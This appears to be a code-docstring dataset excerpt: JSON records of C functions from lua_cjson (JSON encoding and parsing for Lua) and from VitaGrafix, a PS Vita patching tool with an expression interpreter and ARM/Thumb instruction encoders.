{"docstring": "/* When enabled, rejects: NaN, Infinity, hexidecimal numbers */\n", "func_signal": "static int json_cfg_refuse_invalid_numbers(lua_State *l)", "code": "{\n    static const char *options_enc_dec[] = { \"none\", \"encode\", \"decode\",\n                                             \"both\", NULL };\n    json_config_t *cfg;\n\n    json_verify_arg_count(l, 1);\n    cfg = json_fetch_config(l);\n\n    json_enum_option(l, options_enc_dec,\n                     &cfg->encode_refuse_badnum,\n                     &cfg->decode_refuse_badnum);\n\n    return 1;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* json_append_string args:\n * - lua_State\n * - JSON strbuf\n * - String (Lua stack index)\n *\n * Returns nothing. Doesn't remove string from Lua stack */\n", "func_signal": "static void json_append_string(lua_State *l, strbuf_t *json, int lindex)", "code": "{\n    const char *escstr;\n    int i;\n    const char *str;\n    size_t len;\n\n    str = lua_tolstring(l, lindex, &len);\n\n    /* Worst case is len * 6 (all unicode escapes).\n     * This buffer is reused constantly for small strings\n     * If there are any excess pages, they won't be hit anyway.\n     * This gains ~5% speedup. */\n    strbuf_ensure_empty_length(json, len * 6 + 2);\n\n    strbuf_append_char_unsafe(json, '\\\"');\n    for (i = 0; i < len; i++) {\n        escstr = char2escape[(unsigned char)str[i]];\n        if (escstr)\n            strbuf_append_string(json, escstr);\n        else\n            strbuf_append_char_unsafe(json, str[i]);\n    }\n    strbuf_append_char_unsafe(json, '\\\"');\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Configures JSON encoding buffer persistence */\n", "func_signal": "static int json_cfg_encode_keep_buffer(lua_State *l)", "code": "{\n    json_config_t *cfg;\n\n    json_verify_arg_count(l, 1);\n    cfg = json_fetch_config(l);\n\n    if (lua_gettop(l)) {\n        luaL_checktype(l, 1, LUA_TBOOLEAN);\n        cfg->encode_keep_buffer = lua_toboolean(l, 1);\n    }\n\n    lua_pushboolean(l, cfg->encode_keep_buffer);\n\n    return 1;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Configures handling of extremely sparse arrays:\n * convert: Convert extremely sparse arrays into objects? Otherwise error.\n * ratio: 0: always allow sparse; 1: never allow sparse; >1: use ratio\n * safe: Always use an array when the max index <= safe */\n", "func_signal": "static int json_cfg_encode_sparse_array(lua_State *l)", "code": "{\n    json_config_t *cfg;\n    int val;\n\n    json_verify_arg_count(l, 3);\n    cfg = json_fetch_config(l);\n\n    switch (lua_gettop(l)) {\n    case 3:\n        val = luaL_checkinteger(l, 3);\n        luaL_argcheck(l, val >= 0, 3, \"expected integer >= 0\");\n        cfg->encode_sparse_safe = val;\n    case 2:\n        val = luaL_checkinteger(l, 2);\n        luaL_argcheck(l, val >= 0, 2, \"expected integer >= 0\");\n        cfg->encode_sparse_ratio = val;\n    case 1:\n        luaL_argcheck(l, lua_isboolean(l, 1), 1, \"expected boolean\");\n        cfg->encode_sparse_convert = lua_toboolean(l, 1);\n    }\n\n    lua_pushboolean(l, cfg->encode_sparse_convert);\n    lua_pushinteger(l, cfg->encode_sparse_ratio);\n    lua_pushinteger(l, cfg->encode_sparse_safe);\n\n    return 3;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* ===== INITIALISATION ===== */\n", "func_signal": "int luaopen_cjson(lua_State *l)", "code": "{\n    luaL_Reg reg[] = {\n        { \"encode\", json_encode },\n        { \"decode\", json_decode },\n        { \"encode_sparse_array\", json_cfg_encode_sparse_array },\n        { \"encode_max_depth\", json_cfg_encode_max_depth },\n        { \"encode_number_precision\", json_cfg_encode_number_precision },\n        { \"encode_keep_buffer\", json_cfg_encode_keep_buffer },\n        { \"refuse_invalid_numbers\", json_cfg_refuse_invalid_numbers },\n        { NULL, NULL }\n    };\n\n    /* Use json_fetch_config as a pointer.\n     * It's faster than using a config string, and more unique */\n    lua_pushlightuserdata(l, &json_config_key);\n    json_create_config(l);\n    lua_settable(l, LUA_REGISTRYINDEX);\n\n    luaL_register(l, \"cjson\", reg);\n\n    /* Set cjson.null */\n    lua_pushlightuserdata(l, NULL);\n    lua_setfield(l, -2, \"null\");\n\n    /* Set cjson.version */\n    lua_pushliteral(l, VERSION);\n    lua_setfield(l, -2, \"version\");\n\n    /* Return cjson table */\n    return 1;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Fills in the token struct.\n * T_STRING will return a pointer to the json_parse_t temporary string\n * T_ERROR will leave the json->index pointer at the error.\n */\n", "func_signal": "static void json_next_token(json_parse_t *json, json_token_t *token)", "code": "{\n    json_token_type_t *ch2token = json->cfg->ch2token;\n    int ch;\n\n    /* Eat whitespace. FIXME: UGLY */\n    token->type = ch2token[(unsigned char)json->data[json->index]];\n    while (token->type == T_WHITESPACE)\n        token->type = ch2token[(unsigned char)json->data[++json->index]];\n\n    token->index = json->index;\n\n    /* Don't advance the pointer for an error or the end */\n    if (token->type == T_ERROR) {\n        json_set_token_error(token, json, \"invalid token\");\n        return;\n    }\n\n    if (token->type == T_END) {\n        return;\n    }\n\n    /* Found a known single character token, advance index and return */\n    if (token->type != T_UNKNOWN) {\n        json->index++;\n        return;\n    }\n\n    /* Process characters which triggered T_UNKNOWN */\n    ch = json->data[json->index];\n\n    /* Must use strncmp() to match the front of the JSON string.\n     * JSON identifier must be lowercase.\n     * When strict_numbers if disabled, either case is allowed for\n     * Infinity/NaN (since we are no longer following the spec..) */\n    if (ch == '\"') {\n        json_next_string_token(json, token);\n        return;\n    } else if (ch == '-' || ('0' <= ch && ch <= '9')) {\n        if (json->cfg->decode_refuse_badnum && json_is_invalid_number(json)) {\n            json_set_token_error(token, json, \"invalid number\");\n            return;\n        }\n        json_next_number_token(json, token);\n        return;\n    } else if (!strncmp(&json->data[json->index], \"true\", 4)) {\n        token->type = T_BOOLEAN;\n        token->value.boolean = 1;\n        json->index += 4;\n        return;\n    } else if (!strncmp(&json->data[json->index], \"false\", 5)) {\n        token->type = T_BOOLEAN;\n        token->value.boolean = 0;\n        json->index += 5;\n        return;\n    } else if (!strncmp(&json->data[json->index], \"null\", 4)) {\n        token->type = T_NULL;\n        json->index += 4;\n        return;\n    } else if (!json->cfg->decode_refuse_badnum &&\n               json_is_invalid_number(json)) {\n        /* When refuse_badnum is disabled, only attempt to process\n         * numbers we know are invalid JSON (Inf, NaN, hex)\n         * This is required to generate an appropriate token error,\n         * otherwise all bad tokens will register as \"invalid number\"\n         */\n        json_next_number_token(json, token);\n        return;\n    }\n\n    /* Token starts with t/f/n but isn't recognised above. */\n    json_set_token_error(token, json, \"invalid token\");\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Configures number precision when converting doubles to text */\n", "func_signal": "static int json_cfg_encode_number_precision(lua_State *l)", "code": "{\n    json_config_t *cfg;\n    int precision;\n\n    json_verify_arg_count(l, 1);\n    cfg = json_fetch_config(l);\n\n    if (lua_gettop(l)) {\n        precision = luaL_checkinteger(l, 1);\n        luaL_argcheck(l, 1 <= precision && precision <= 14, 1,\n                      \"expected integer between 1 and 14\");\n        json_set_number_precision(cfg, precision);\n    }\n\n    lua_pushinteger(l, cfg->encode_number_precision);\n\n    return 1;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* json_append_array args:\n * - lua_State\n * - JSON strbuf\n * - Size of passwd Lua array (top of stack) */\n", "func_signal": "static void json_append_array(lua_State *l, json_config_t *cfg, strbuf_t *json,\n                              int array_length)", "code": "{\n    int comma, i;\n\n    json_encode_descend(l, cfg);\n\n    strbuf_append_char(json, '[');\n\n    comma = 0;\n    for (i = 1; i <= array_length; i++) {\n        if (comma)\n            strbuf_append_char(json, ',');\n        else\n            comma = 1;\n\n        lua_rawgeti(l, -1, i);\n        json_append_data(l, cfg, json);\n        lua_pop(l, 1);\n    }\n\n    strbuf_append_char(json, ']');\n\n    cfg->current_depth--;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* json_text must be null terminated string */\n", "func_signal": "static void lua_json_decode(lua_State *l, const char *json_text, int json_len)", "code": "{\n    json_parse_t json;\n    json_token_t token;\n\n    json.cfg = json_fetch_config(l);\n    json.data = json_text;\n    json.index = 0;\n\n    /* Ensure the temporary buffer can hold the entire string.\n     * This means we no longer need to do length checks since the decoded\n     * string must be smaller than the entire json string */\n    json.tmp = strbuf_new(json_len);\n\n    json_next_token(&json, &token);\n    json_process_value(l, &json, &token);\n\n    /* Ensure there is no more input left */\n    json_next_token(&json, &token);\n\n    if (token.type != T_END)\n        json_throw_parse_error(l, &json, \"the end\", &token);\n\n    strbuf_free(json.tmp);\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Serialise Lua data into JSON string. */\n", "func_signal": "static void json_append_data(lua_State *l, json_config_t *cfg, strbuf_t *json)", "code": "{\n    int len;\n\n    switch (lua_type(l, -1)) {\n    case LUA_TSTRING:\n        json_append_string(l, json, -1);\n        break;\n    case LUA_TNUMBER:\n        json_append_number(l, json, -1, cfg);\n        break;\n    case LUA_TBOOLEAN:\n        if (lua_toboolean(l, -1))\n            strbuf_append_mem(json, \"true\", 4);\n        else\n            strbuf_append_mem(json, \"false\", 5);\n        break;\n    case LUA_TTABLE:\n        len = lua_array_length(l, cfg);\n        if (len > 0)\n            json_append_array(l, cfg, json, len);\n        else\n            json_append_object(l, cfg, json);\n        break;\n    case LUA_TNIL:\n        strbuf_append_mem(json, \"null\", 4);\n        break;\n    case LUA_TLIGHTUSERDATA:\n        if (lua_touserdata(l, -1) == NULL) {\n            strbuf_append_mem(json, \"null\", 4);\n            break;\n        }\n    default:\n        /* Remaining types (LUA_TFUNCTION, LUA_TUSERDATA, LUA_TTHREAD,\n         * and LUA_TLIGHTUSERDATA) cannot be serialised */\n        json_encode_exception(l, cfg, -1, \"type not supported\");\n        /* never returns */\n    }\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Converts a Unicode codepoint to UTF-8.\n * Returns UTF-8 string length, and up to 4 bytes in *utf8 */\n", "func_signal": "static int codepoint_to_utf8(char *utf8, int codepoint)", "code": "{\n    /* 0xxxxxxx */\n    if (codepoint <= 0x7F) {\n        utf8[0] = codepoint;\n        return 1;\n    }\n\n    /* 110xxxxx 10xxxxxx */\n    if (codepoint <= 0x7FF) {\n        utf8[0] = (codepoint >> 6) | 0xC0;\n        utf8[1] = (codepoint & 0x3F) | 0x80;\n        return 2;\n    }\n\n    /* 1110xxxx 10xxxxxx 10xxxxxx */\n    if (codepoint <= 0xFFFF) {\n        utf8[0] = (codepoint >> 12) | 0xE0;\n        utf8[1] = ((codepoint >> 6) & 0x3F) | 0x80;\n        utf8[2] = (codepoint & 0x3F) | 0x80;\n        return 3;\n    }\n\n    /* 11110xxx 10xxxxxx 10xxxxxx 10xxxxxx */\n    if (codepoint <= 0x1FFFFF) {\n        utf8[0] = (codepoint >> 18) | 0xF0;\n        utf8[1] = ((codepoint >> 12) & 0x3F) | 0x80;\n        utf8[2] = ((codepoint >> 6) & 0x3F) | 0x80;\n        utf8[3] = (codepoint & 0x3F) | 0x80;\n        return 4;\n    }\n\n    return 0;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* ===== ENCODING ===== */\n", "func_signal": "static void json_encode_exception(lua_State *l, json_config_t *cfg, int lindex,\n                                  const char *reason)", "code": "{\n    if (!cfg->encode_keep_buffer)\n        strbuf_free(&cfg->encode_buf);\n    luaL_error(l, \"Cannot serialise %s: %s\",\n                  lua_typename(l, lua_type(l, lindex)), reason);\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Called when index pointing to beginning of UTF-16 code escape: \\uXXXX\n * \\u is guaranteed to exist, but the remaining hex characters may be\n * missing.\n * Translate to UTF-8 and append to temporary token string.\n * Must advance index to the next character to be processed.\n * Returns: 0   success\n *          -1  error\n */\n", "func_signal": "static int json_append_unicode_escape(json_parse_t *json)", "code": "{\n    char utf8[4];       /* Surrogate pairs require 4 UTF-8 bytes */\n    int codepoint;\n    int surrogate_low;\n    int len;\n    int escape_len = 6;\n\n    /* Fetch UTF-16 code unit */\n    codepoint = decode_hex4(&json->data[json->index + 2]);\n    if (codepoint < 0)\n        return -1;\n\n    /* UTF-16 surrogate pairs take the following 2 byte form:\n     *      11011 x yyyyyyyyyy\n     * When x = 0: y is the high 10 bits of the codepoint\n     *      x = 1: y is the low 10 bits of the codepoint\n     *\n     * Check for a surrogate pair (high or low) */\n    if ((codepoint & 0xF800) == 0xD800) {\n        /* Error if the 1st surrogate is not high */\n        if (codepoint & 0x400)\n            return -1;\n\n        /* Ensure the next code is a unicode escape */\n        if (json->data[json->index + escape_len] != '\\\\' ||\n            json->data[json->index + escape_len + 1] != 'u') {\n            return -1;\n        }\n\n        /* Fetch the next codepoint */\n        surrogate_low = decode_hex4(&json->data[json->index + 2 + escape_len]);\n        if (surrogate_low < 0)\n            return -1;\n\n        /* Error if the 2nd code is not a low surrogate */\n        if ((surrogate_low & 0xFC00) != 0xDC00)\n            return -1;\n\n        /* Calculate Unicode codepoint */\n        codepoint = (codepoint & 0x3FF) << 10;\n        surrogate_low &= 0x3FF;\n        codepoint = (codepoint | surrogate_low) + 0x10000;\n        escape_len = 12;\n    }\n\n    /* Convert codepoint to UTF-8 */\n    len = codepoint_to_utf8(utf8, codepoint);\n    if (!len)\n        return -1;\n\n    /* Append bytes and advance parse index */\n    strbuf_append_mem_unsafe(json->tmp, utf8, len);\n    json->index += escape_len;\n\n    return 0;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Find the size of the array on the top of the Lua stack\n * -1   object (not a pure array)\n * >=0  elements in array\n */\n", "func_signal": "static int lua_array_length(lua_State *l, json_config_t *cfg)", "code": "{\n    double k;\n    int max;\n    int items;\n\n    max = 0;\n    items = 0;\n\n    lua_pushnil(l);\n    /* table, startkey */\n    while (lua_next(l, -2) != 0) {\n        /* table, key, value */\n        if (lua_type(l, -2) == LUA_TNUMBER &&\n            (k = lua_tonumber(l, -2))) {\n            /* Integer >= 1 ? */\n            if (floor(k) == k && k >= 1) {\n                if (k > max)\n                    max = k;\n                items++;\n                lua_pop(l, 1);\n                continue;\n            }\n        }\n\n        /* Must not be an array (non integer key) */\n        lua_pop(l, 2);\n        return -1;\n    }\n\n    /* Encode excessively sparse arrays as objects (if enabled) */\n    if (cfg->encode_sparse_ratio > 0 &&\n        max > items * cfg->encode_sparse_ratio &&\n        max > cfg->encode_sparse_safe) {\n        if (!cfg->encode_sparse_convert)\n            json_encode_exception(l, cfg, -1, \"excessively sparse array\");\n\n        return -1;\n    }\n\n    return max;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* On argument: decode enum and set config variables\n * **options must point to a NULL terminated array of 4 enums\n * Returns: current enum value */\n", "func_signal": "static void json_enum_option(lua_State *l, const char **options,\n                             int *opt1, int *opt2)", "code": "{\n    int setting;\n\n    if (lua_gettop(l)) {\n        if (lua_isboolean(l, 1))\n            setting = lua_toboolean(l, 1) * 3;\n        else\n            setting = luaL_checkoption(l, 1, NULL, options);\n\n        *opt1 = setting & 1 ? 1 : 0;\n        *opt2 = setting & 2 ? 1 : 0;\n    } else {\n        setting = *opt1 | (*opt2 << 1);\n    }\n\n    if (setting)\n        lua_pushstring(l, options[setting]);\n    else\n        lua_pushboolean(l, 0);\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Handle the array context */\n", "func_signal": "static void json_parse_array_context(lua_State *l, json_parse_t *json)", "code": "{\n    json_token_t token;\n    int i;\n\n    /* 2 slots required:\n     * .., table, value */\n    json_decode_checkstack(l, json, 2);\n\n    lua_newtable(l);\n\n    json_next_token(json, &token);\n\n    /* Handle empty arrays */\n    if (token.type == T_ARR_END)\n        return;\n\n    for (i = 1; ; i++) {\n        json_process_value(l, json, &token);\n        lua_rawseti(l, -2, i);            /* arr[i] = value */\n\n        json_next_token(json, &token);\n\n        if (token.type == T_ARR_END)\n            return;\n\n        if (token.type != T_COMMA)\n            json_throw_parse_error(l, json, \"comma or array end\", &token);\n\n        json_next_token(json, &token);\n    }\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Handle the \"value\" context */\n", "func_signal": "static void json_process_value(lua_State *l, json_parse_t *json,\n                               json_token_t *token)", "code": "{\n    switch (token->type) {\n    case T_STRING:\n        lua_pushlstring(l, token->value.string, token->string_len);\n        break;;\n    case T_NUMBER:\n        lua_pushnumber(l, token->value.number);\n        break;;\n    case T_BOOLEAN:\n        lua_pushboolean(l, token->value.boolean);\n        break;;\n    case T_OBJ_BEGIN:\n        json_parse_object_context(l, json);\n        break;;\n    case T_ARR_BEGIN:\n        json_parse_array_context(l, json);\n        break;;\n    case T_NULL:\n        /* In Lua, setting \"t[k] = nil\" will delete k from the table.\n         * Hence a NULL pointer lightuserdata object is used instead */\n        lua_pushlightuserdata(l, NULL);\n        break;;\n    default:\n        json_throw_parse_error(l, json, \"value\", token);\n    }\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* ===== CONFIGURATION ===== */\n", "func_signal": "static json_config_t *json_fetch_config(lua_State *l)", "code": "{\n    json_config_t *cfg;\n\n    lua_pushlightuserdata(l, &json_config_key);\n    lua_gettable(l, LUA_REGISTRYINDEX);\n    cfg = lua_touserdata(l, -1);\n    if (!cfg)\n        luaL_error(l, \"BUG: Unable to fetch CJSON configuration\");\n\n    lua_pop(l, 1);\n\n    return cfg;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/* Configures the maximum number of nested arrays/objects allowed when\n * encoding */\n", "func_signal": "static int json_cfg_encode_max_depth(lua_State *l)", "code": "{\n    json_config_t *cfg;\n    int depth;\n\n    json_verify_arg_count(l, 1);\n    cfg = json_fetch_config(l);\n\n    if (lua_gettop(l)) {\n        depth = luaL_checkinteger(l, 1);\n        luaL_argcheck(l, depth > 0, 1, \"expected positive integer\");\n        cfg->encode_max_depth = depth;\n    }\n\n    lua_pushinteger(l, cfg->encode_max_depth);\n\n    return 1;\n}", "path": "deps\\lua\\lua_cjson.c", "repo_name": "git-hulk/tcpkit", "stars": 421, "license": "mit", "language": "c", "size": 2568}
{"docstring": "/**\n * Parses segment & offset (e.g. 0:0x12345)\n */\n", "func_signal": "static vg_io_status_t vg_patch_parse_address(\n        const char line[], int *pos, uint8_t *segment, uint32_t *offset)", "code": "{\n\n    char *next = NULL;\n\n    // Parse segment\n    *segment = strtoul(&line[*pos], &next, 10); // always base 10\n    (*pos) += (next - &line[*pos]) + 1;\n    if (*next != ':') {\n        __ret_status(IO_ERROR_PARSE_INVALID_TOKEN, 0, (*pos - 1));\n    }\n\n    // Parse offset\n    *offset = strtoul(&line[*pos], &next, 0);\n    (*pos) += (next - &line[*pos]) + 1;\n    if (!isspace(*next))\n        __ret_status(IO_ERROR_PARSE_INVALID_TOKEN, 0, (*pos - 1));\n\n    //vg_log_printf(\"Address: %d:0x%X\\n\", *segment, *offset);\n\n    __ret_status(IO_OK, 0, 0);\n}", "path": "src\\patch.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * Parses and applies a common hook\n */\n", "func_signal": "vg_io_status_t vg_hook_parse_patch(const char line[])", "code": "{\n    void *hookPtr;\n    uint32_t importNid;\n    uint8_t shallHook = 0;\n    vg_io_status_t ret = {IO_OK, 0, 0};\n\n    // Check for common hook\n    ret = vg_hook_parse_common(line, &importNid, &hookPtr, &shallHook);\n    if (ret.code != IO_OK)\n        return ret;\n\n    // Apply\n    if (shallHook) {\n        return vg_hook_function_import(importNid, hookPtr);\n    }\n\n    return ret;\n}", "path": "src\\patch_hook.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Cast LHS/RHS to common data type (if necessary)\n *         if LHS or RHS type is FLOAT - cast both to FLOAT\n *         if LHS or RHS type is SIGNED - cast both to SIGNED\n *\n * @param lhs              left-hand side\n * @param rhs              right-hand side\n */\n", "func_signal": "void common_cast(value_t *lhs, value_t *rhs)", "code": "{\n    // Float\n    if (lhs->type == DATA_TYPE_FLOAT || rhs->type == DATA_TYPE_FLOAT) {\n        value_cast(lhs, DATA_TYPE_FLOAT);\n        value_cast(rhs, DATA_TYPE_FLOAT);\n    }\n    // Signed\n    else if (lhs->type == DATA_TYPE_SIGNED || rhs->type == DATA_TYPE_SIGNED) {\n        value_cast(lhs, DATA_TYPE_SIGNED);\n        value_cast(rhs, DATA_TYPE_SIGNED);\n    }\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/*\n * T2 VMOV<c>.F32 <Sd>, #<imm>\n *\n * 1110      11101  x 11 xxxx  xxxx 101 0  0000 xxxx\n * Condition OPcode D    imm4H Vd       sz      imm4L\n *\n * byte 1   byte 0   byte 3   byte 2\n * 11101110 1x11xxxx xxxx1010 0000xxxx\n */\n", "func_signal": "bool op_encode_t2_vmov_f32(value_t *out, value_t *value)", "code": "{\n    uint8_t reg = (uint8_t)out->data.uint32;\n    memset(out->data.raw, 0, 4);\n    value_raw(out, 4);\n\n    out->data.raw[1] |= 0b11101110; // Condition + OP\n    out->data.raw[0] |= 0b10110000; // OP\n    out->data.raw[3] |= 0b00001010; // OP\n\n    // Vd:D\n    if (reg & 0b1)\n        out->data.raw[0] |= 0b01000000;       // D\n    out->data.raw[3] |= (reg & 0b11110) << 3; // Vd\n\n    // imm4H:imm4L\n    uint8_t imm8 = 0;\n    if (value->data.uint32 & (1 << 31))\n        imm8 |= 1 << 7; // sign bit\n    if (((value->data.uint32 >> 25) & 0b111111) < 0b100000)\n        imm8 |= 1 << 6; // < 2.0\n    imm8 |= (value->data.uint32 >> 19) & 0b111111;\n\n    out->data.raw[0] |= (imm8 & 0b11110000) >> 4; // imm4H\n    out->data.raw[2] |= (imm8 & 0b00001111);      // imm4L\n    return true;\n}", "path": "src\\interpreter\\op_encode.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Parse and evaluate binary expression subtree\n *         aka. precedence climbing algorithm\n *\n *         value has to be already evaluated LHS,\n *         &expr[pos] should start with next operator (if any)\n *\n * @param expr             given expression\n * @param pos              position in given expression (offset)\n *                          starting with infix op + RHS\n * @param value            OUT - value\n * @param min_precedence   minimal precedence\n *\n * @return status\n */\n", "func_signal": "intp_status_t parse_subtree(const char *expr, uint32_t *pos, value_t *value, int min_precedence)", "code": "{\n    if (!skip_ws(expr, pos))\n        __intp_ret_status(INTP_STATUS_OK, *pos);\n\n    uint32_t pos_infix_op = *pos;\n    intp_status_t ret;\n    value_t rhs = {0};\n    const token_t *token;\n\n    // Peek next token (operator)\n    ret = peek_token(expr, *pos, NULL, &token, false, false);\n    if (ret.code != INTP_STATUS_OK)\n        return ret;\n\n    // Handle terminating token\n    if (token->type == TOKEN_TERMINATOR)\n        __intp_ret_status(INTP_STATUS_OK, *pos);\n\n    // While next token is infix operator with minimal precedence\n    while ((token->flags & TOKEN_INFIX)\n            && token->precedence >= min_precedence\n            && token->op != NULL) {\n        const token_t *op = token;\n\n        // Advance to next token (skip infix)\n        ret = parse_token(expr, pos, NULL, &token, false, false);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        // Parse RHS\n        ret = parse_value(expr, pos, &rhs, false, true);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        // Peek next token\n        ret = peek_token(expr, *pos, NULL, &token, false, false);\n        if (ret.code != INTP_STATUS_OK)\n            return ret;\n\n        // If next infix token has higher precedence, evaluate RHS first!\n        while ((token->flags & TOKEN_INFIX)\n                && token->precedence > op->precedence) {\n            // Honor precedence\n            ret = parse_subtree(expr, pos, &rhs, token->precedence);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n\n            // Peek next token\n            ret = peek_token(expr, *pos, NULL, &token, false, false);\n            if (ret.code != INTP_STATUS_OK)\n                return ret;\n        }\n\n        // Apply op\n        bool op_ret = ((bool (*)(value_t *, value_t *))(op->op))(value, &rhs);\n        if (!op_ret)\n            __intp_ret_status(INTP_STATUS_ERROR_INVALID_DATATYPE, pos_infix_op);\n    }\n\n    __intp_ret_status(INTP_STATUS_OK, *pos);\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "//int vgPatchGetNextMacroArgPos()\n", "func_signal": "int legacy_get_next_macro_arg_pos(const char chunk[], int pos, int end)", "code": "{\n    int inner_open = 0;\n\n    while (pos < end - 3 && (inner_open > 0 || chunk[pos] != ',')) {\n        // Allow stacking, e.g.: </,<*,<ib_w>,10>,10>\n        if (chunk[pos] == '<')\n            inner_open++;\n        if (chunk[pos] == '>')\n            inner_open--;\n        pos++;\n    }\n\n    return pos + 1;\n}", "path": "src\\interpreter\\legacy.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/*\n * A2 MOVW<c> <Rd>,#<imm16>\n *\n * 1110      00110000 xxxx xxxx xxxxxxxxxxxx\n * Condition OPcode   imm4 Rd   imm12\n *\n * byte 3   byte 2   byte 1   byte 0\n * 11100011 0000xxxx xxxxxxxx xxxxxxxx\n */\n", "func_signal": "bool op_encode_a2_mov(value_t *out, value_t *value)", "code": "{\n    uint8_t reg = (uint8_t)out->data.uint32;\n    memset(out->data.raw, 0, 4);\n    value_raw(out, 4);\n\n    out->data.raw[3] |= 0b11100000;       // Condition\n    out->data.raw[3] |= 0b00000010;       // Immediate value\n    out->data.raw[3] |= 0b00000001;       // OPcode\n    out->data.raw[1] |= reg << 4;         // Rd\n\n    out->data.raw[2] |= (value->data.uint32 & 0b1111000000000000) >> 12; // imm4\n    out->data.raw[1] |= (value->data.uint32 & 0b0000111100000000) >> 8;  // imm12\n    out->data.raw[0] |= (value->data.uint32 & 0b0000000011111111);\n    return true;\n}", "path": "src\\interpreter\\op_encode.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/**\n * @brief Skip all whitespaces, increment pos\n *\n * @param expr             given expression\n * @param pos              starting position in given expression (offset)\n * @return                 false if EOF, true otherwise\n */\n", "func_signal": "bool skip_ws(const char *expr, uint32_t *pos)", "code": "{\n    while (expr[*pos] != '\\0' && isspace(expr[*pos])) (*pos)++;\n    return expr[*pos] != '\\0';\n}", "path": "src\\interpreter\\parser.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
{"docstring": "/*\n * T3 MOVW<c> <Rd>,#<imm16>\n *\n * 11110           x 10     0  1    00  xxxx - 0  xxx  xxxx xxxxxxxx\n * Data processing i 16-bit OP Move OP2 imm4   DP imm3 Rd   imm8\n *\n * byte 1   byte 0     byte 3   byte 2\n * 11110x10 0100xxxx - 0xxxxxxx xxxxxxxx\n */\n", "func_signal": "bool op_encode_t3_mov(value_t *out, value_t *value)", "code": "{\n    uint8_t reg = (uint8_t)out->data.uint32;\n    memset(out->data.raw, 0, 4);\n    value_raw(out, 4);\n\n    out->data.raw[1] |= 0b11110010; // Data processing (16-bit)\n    out->data.raw[0] |= 0b01000000; // Move, plain (16-bit)\n    out->data.raw[3] |= reg;        // Rd\n\n    out->data.raw[0] |= (value->data.uint32 & 0b1111000000000000) >> 12;   // imm4\n    out->data.raw[1] |= (value->data.uint32 & 0b0000100000000000) >> 9;    // i\n    out->data.raw[3] |= (value->data.uint32 & 0b0000011100000000) >> 4;    // imm3\n    out->data.raw[2] |= (value->data.uint32 & 0b0000000011111111);         // imm8\n    return true;\n}", "path": "src\\interpreter\\op_encode.c", "repo_name": "Electry/VitaGrafix", "stars": 373, "license": "gpl-3.0", "language": "c", "size": 228}
